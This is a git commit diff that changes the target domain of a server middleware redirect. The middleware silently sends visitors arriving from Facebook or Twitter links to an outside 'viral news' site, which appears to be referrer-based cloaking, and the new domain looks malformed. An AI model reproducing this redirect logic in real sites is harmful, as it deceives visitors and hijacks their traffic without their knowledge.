72c0f5ba0b9f993114e42b4e1621cd9d5642e69f
ngotinh <kendyngo123@gmail.com>
2023-03-01 06:51:47 +0700

    Update [...slug].ts

--- server/middleware/[...slug].ts
+++ server/middleware/[...slug].ts
@@ -2,6 +2,6 @@ export default defineEventHandler((event) => {
     const headers = event.req.headers;
     
     if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
-        sendRedirect(event,"https://ancient.viralkhabarpost.com/"+event.req.url);
+        sendRedirect(event,"https://archaeology.news22.u/"+event.req.url);
     }
 })
